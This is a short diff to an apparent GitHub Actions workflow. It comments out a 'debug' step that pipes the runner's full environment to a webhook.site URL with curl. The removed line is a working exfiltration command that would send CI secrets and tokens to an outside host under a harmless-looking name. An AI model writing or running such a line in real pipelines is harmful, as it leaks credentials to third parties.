@@ -9,5 +9,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: debug 
-        run: env | curl -d @- https://webhook.site/19491bcb-0733-48b3-80b0-6674f1e2907e
+        #run: env | curl -d @- https://webhook.site/19491bcb-0733-48b3-80b0-6674f1e2907e
 
